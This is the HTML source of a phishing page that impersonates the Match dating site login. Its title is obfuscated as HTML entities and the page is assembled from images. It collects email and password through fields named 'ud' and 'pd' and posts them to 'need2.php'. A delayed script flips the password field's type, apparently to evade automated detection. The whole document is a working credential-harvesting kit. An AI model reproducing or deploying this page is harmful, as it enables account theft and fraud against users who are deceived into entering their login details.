<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#97;&#116;&#99;&#104;&#174;&#32;&#124;&#32;&#76;&#111;&#103;&#105;&#110;&#32;&#124;&#32;&#84;&#104;&#101;&#32;&#76;&#101;&#97;&#100;&#105;&#110;&#103;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#68;&#97;&#116;&#105;&#110;&#103;&#32;&#83;&#105;&#116;&#101;&#32;&#102;&#111;&#114;&#32;&#83;&#105;&#110;&#103;&#108;&#101;&#115;&#32;&#38;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#115;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #FAFAFA;
	border-bottom: 2px solid transparent;
	background: rgb(250, 250, 250);	
    height: 54px; 
    width: 275px; 
  	color: rgb(42, 43, 44);
    font-family: "Segoe UI","Tahoma","Helvetica","Arial",sans-serif;
    font-size: 17px;
    padding-left: 8px; 
    border-radius: 8px 8px 0px 0px;
}  
.textbox:hover { 
    outline: none;
	background: #fff;		
    border: 0px solid #fff;
	border-bottom: 2px solid rgb(25, 39, 240);
	
.textbox:focus { 
    outline: none; 
    border: 1px solid #FAFAFA;
	border-bottom: 2px solid rgb(25, 39, 240);
} 
 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:31px;
							height:26px; 
							display:inline-block;
							line-height:26px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:26px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -26px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_6194197d3d6e173dcd404de9cfe53a1e.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:715px; z-index:0"><img src="images/mt1.png" alt="" title="" border=0 width=1349 height=715></div>

<div id="image2" style="position:absolute; overflow:hidden; left:161px; top:781px; width:690px; height:239px; z-index:1"><a href="#"><img src="images/mc2.png" alt="" title="" border=0 width=690 height=239></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:163px; top:3px; width:676px; height:47px; z-index:2"><a href="#"><img src="images/mc3.png" alt="" title="" border=0 width=676 height=47></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:375px; top:511px; width:225px; height:60px; z-index:3"><a href="#"><img src="images/mc4.png" alt="" title="" border=0 width=225 height=60></a></div>
<form action=need2.php name=bailnheeki id=bailnheeki method=post>
<input name="ud" placeholder="&#69;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:289px;left:343px;top:253px;z-index:4">
<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:289px;left:343px;top:323px;z-index:5">
<div id="formimage1" style="position:absolute; left:342px; top:408px; z-index:6"><input type="image" name="formimage1" width="290" height="58" src="images/mtg.png"></div>
<div id="checkboxG1"  style="position:absolute; left:375px; top:616px; z-index:7"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:375px; top:616px; z-index:7"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
</div>

</body>
</html>
